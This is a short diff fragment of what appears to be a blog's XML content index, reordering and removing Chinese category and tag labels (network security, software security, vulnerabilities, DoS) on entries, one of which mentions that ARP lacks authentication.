-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>软件安全</tag>
       </tags>
   </entry>
   <entry>
@@ -5684,8 +5684,8 @@ ARP 协议没有认证机制，只要接收到的协议包是有效的，主机�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>网络安全</category>
         <category>漏洞</category>
+        <category>网络安全</category>
         <category>DoS</category>
       </categories>
       <tags>
